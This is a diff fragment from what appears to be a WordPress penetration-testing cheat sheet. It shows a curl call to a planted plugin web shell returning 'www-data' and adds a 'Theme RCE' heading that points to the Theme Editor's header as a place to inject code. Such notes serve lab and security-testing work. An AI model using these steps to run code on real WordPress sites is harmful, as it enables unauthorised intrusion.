@@ -27,3 +27,7 @@ kali@kali:~$ curl http://10.10.10.10/wp-content/plugins/plugin-shell/plugin-shel
 www-data
 ```
 
+### Theme RCE
+
+WordPress &gt; Appearance &gt; Theme Editor &gt; Theme Header
+
